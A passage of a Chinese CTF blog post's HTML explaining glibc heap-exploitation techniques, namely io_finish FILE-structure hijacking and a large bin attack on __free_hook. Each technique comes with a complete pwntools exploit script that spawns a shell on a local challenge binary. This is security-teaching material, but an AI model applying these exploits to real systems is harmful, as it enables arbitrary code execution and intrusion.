+<h4 id="利用io-finish"><a href="#利用io-finish" class="headerlink" title="利用io_finish"></a>利用io_finish</h4><p>同之前io_overflow类似，io_finish会以_IO_buf_base处的值为参数跳转至fd+0xe8处的值。<br>设置虚表地址为io_str_jump-0x8（异常总会调用虚标+0x18处的函数）<br>设置_IO_buf_base为bin/sh字符串地址，设置0xe8偏移处为system函数。<br>相较io_overflow不会有one_gadget不可用的情况。<br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./0ctf111'</span>)</span><br><span class="line">e=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.24.so'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">	file_struct = p32(_flags) + \</span><br><span class="line">	     p32(<span class="number">0</span>) + \</span><br><span class="line">	     p64(_IO_read_ptr) + \</span><br><span class="line">	     p64(_IO_read_end) + \</span><br><span class="line">	     p64(_IO_read_base) + \</span><br><span class="line">	     p64(_IO_write_base) + \</span><br><span class="line">	     p64(_IO_write_ptr) + \</span><br><span class="line">	     p64(_IO_write_end) + \</span><br><span class="line">	     p64(_IO_buf_base) + \</span><br><span class="line">	     p64(_IO_buf_end) + \</span><br><span class="line">	     p64(_IO_save_base) + \</span><br><span class="line">	     p64(_IO_backup_base) + \</span><br><span class="line">	     p64(_IO_save_end) + \</span><br><span class="line">	     p64(_IO_marker) + \</span><br><span class="line">	     p64(_IO_chain) + \</span><br><span class="line">	     p32(_fileno)</span><br><span class="line">	file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">	file_struct += p64(_lock)</span><br><span class="line">	file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">	file_struct += p64(_wide_data)</span><br><span class="line">	file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">	file_struct += p64(_mode)</span><br><span class="line">	file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">	<span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.readuntil(<span class="string">'Command:'</span>)</span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(a)</span>:</span></span><br><span class="line">	p.writeline(<span class="string">'1'</span>)</span><br><span class="line">	p.readuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.writeline(str(a))</span><br><span class="line">	p.readuntil(<span class="string">'Command:'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">	p.writeline(<span class="string">'2'</span>)</span><br><span class="line">	p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.writeline(str(a))</span><br><span class="line">	p.readuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.writeline(str(b))</span><br><span class="line">	p.readuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.write(c)</span><br><span class="line">	p.readuntil(<span class="string">'Command:'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(a)</span>:</span>	</span><br><span class="line">	p.writeline(<span class="string">'3'</span>)	</span><br><span class="line">	p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.writeline(str(a))</span><br><span class="line">	p.readuntil(<span class="string">'Command:'</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#4</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#5</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x90</span>+p64(<span class="number">0x00</span>)+p64(<span class="number">0x141</span>)</span><br><span class="line">payl=<span class="string">'/bin/sh'</span>+chr(<span class="number">0</span>)</span><br><span class="line">update(<span class="number">0</span>,len(payl),payl)</span><br><span class="line">update(<span class="number">2</span>,len(payload),payload)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">alloc(<span class="number">0x90</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">libc=u64(p.read(<span class="number">6</span>)+chr(<span class="number">0</span>)*<span class="number">2</span>)<span class="number">-0x398B58</span></span><br><span class="line">io_list_all_addr = libc + e.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">jump_table_addr = libc + e.symbols[<span class="string">'_IO_file_jumps'</span>] + <span class="number">0xc0</span></span><br><span class="line">binsh_addr=libc+<span class="number">0x1618b9</span></span><br><span class="line">file_struct = pack_file(_flags = <span class="number">0</span>,</span><br><span class="line">                        _IO_read_ptr = <span class="number">0x61</span>, </span><br><span class="line">                        _IO_read_base = io_list_all_addr<span class="number">-0x10</span>, </span><br><span class="line">                        _IO_write_base = <span class="number">0</span>,</span><br><span class="line">                        _IO_write_ptr = <span class="number">1</span>,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = <span class="number">0</span>,</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">file_struct += p64(jump_table_addr<span class="number">-0x8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">file_struct += p64(libc + e.symbols[<span class="string">'system'</span>])</span><br><span class="line">alloc(<span class="number">0x90</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x90</span>+file_struct</span><br><span class="line">update(<span class="number">3</span>,len(payload),payload)</span><br><span class="line">success(hex(jump_table_addr<span class="number">-0x8</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h4 id="large-bin-attack修改free-hook"><a href="#large-bin-attack修改free-hook" class="headerlink" title="large bin attack修改free_hook"></a>large bin attack修改free_hook</h4><p>原理同0ctf heapstorm类似，unsorted bin链表卸载转移到large bin时会有两次的内存写操作，将内存写入自己堆块的地址。利用这两次写伪造出一个在free_hook上方的chunk，并使unsorted bin的bk指针指向这个伪造的chunk。再次分配即可分配到free_hook上方任意地址。<br><img src="/2018/09/11/堆溢出的六种利用手法/14.png" alt=""><br>之前分析过可以参考博客<a href="http://www.pwndog.top/2018/07/27/0ctf-heapstorm%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">http://www.pwndog.top/2018/07/27/0ctf-heapstorm%E7%AC%94%E8%AE%B0/</a></p>
+<p><a href="http://www.pwndog.top/2018/07/24/malloc%E5%87%BD%E6%95%B0%E6%BA%90%E7%A0%81%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">http://www.pwndog.top/2018/07/24/malloc%E5%87%BD%E6%95%B0%E6%BA%90%E7%A0%81%E7%AC%94%E8%AE%B0/</a><br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#4</span></span><br><span class="line">alloc(<span class="number">0x90</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x90</span>+p64(<span class="number">0x00</span>)+p64(<span class="number">0x141</span>)</span><br><span class="line">payl=<span class="string">'/bin/sh'</span>+chr(<span class="number">0</span>)</span><br><span class="line">update(<span class="number">0</span>,len(payl),payl)</span><br><span class="line">update(<span class="number">2</span>,len(payload),payload)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">alloc(<span class="number">0x90</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">libc=u64(p.read(<span class="number">6</span>)+chr(<span class="number">0</span>)*<span class="number">2</span>)<span class="number">-0x398B58</span></span><br><span class="line">free_hook=libc+e.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">alloc(<span class="number">0x90</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">alloc(<span class="number">0x20</span>)</span><br><span class="line">alloc(<span class="number">0x510</span>)</span><br><span class="line">alloc(<span class="number">0x20</span>)</span><br><span class="line">alloc(<span class="number">0x520</span>)</span><br><span class="line">alloc(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x600</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>)+p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x20</span>+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x45</span>+<span class="number">0x8</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x521</span>)+p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x20</span>)</span><br><span class="line">update(<span class="number">2</span>,len(payload),payload)</span><br><span class="line">success(hex(free_hook))</span><br><span class="line">system=libc+e.symbols[<span class="string">'system'</span>]</span><br><span class="line">alloc(<span class="number">0x40</span>)</span><br><span class="line">payload=<span class="string">'/bin/sh'</span>+chr(<span class="number">0</span>)*<span class="number">9</span>+p64(system)</span><br><span class="line">update(<span class="number">3</span>,len(payload),payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>最后写的越来越累，写脚本时很爽，但是描述起来太麻烦。稍有偷懒以后有时间再编辑。</p>
+
+  </div>
+  <footer class="article-footer">
+    
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.C" target="_blank" title="Attribution-ShareAlike">
+      <img src="/images/cc/cc.png">
+      
+          <img src="/images/cc/by.png">
+        
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
+      </span>
+    </a>
+  </div>
+
+
+    
+
+  </footer>
+</article>
+
+
+
+
+
+
+
+          <div class="main-footer">
+  
+    © 2018 pwndog&#39;s blog - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
+  
+</div>
+
+      
+        </div>
+      
+    </div>
+  </div>
+  <script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+  <link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
+  <link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+             It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+      <!-- Container that holds slides.
+                PhotoSwipe keeps only 3 of them in the DOM to save memory.
+                Don't modify these 3 pswp__item elements, data is added later on. -->
+      <div class="pswp__container">
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+      </div>
+
+      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+      <div class="pswp__ui pswp__ui--hidden">
+
+        <div class="pswp__top-bar">
+
+          <!--  Controls are self-explanatory. Order can be changed. -->
+
+          <div class="pswp__counter"></div>
+
+          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+          <button class="pswp__button pswp__button--share" title="Share"></button>
+
+          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+          <!-- element will get class pswp__preloader--active when preloader is running -->
+          <div class="pswp__preloader">
+            <div class="pswp__preloader__icn">
+              <div class="pswp__preloader__cut">
+                <div class="pswp__preloader__donut"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+          <div class="pswp__share-tooltip"></div>
+        </div>
+
+        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+
+        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+        <div class="pswp__caption">
+          <div class="pswp__caption__center"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/PhotoSwipe/photoswipe.js"></script>
+  <script src="/PhotoSwipe/photoswipe-ui-default.js"></script>
+
+
+<script src="/perfect-scrollbar/js/min/perfect-scrollbar.min.js"></script>
+<script src="/scripts/main.js"></script>
+
+</body>
+</html>
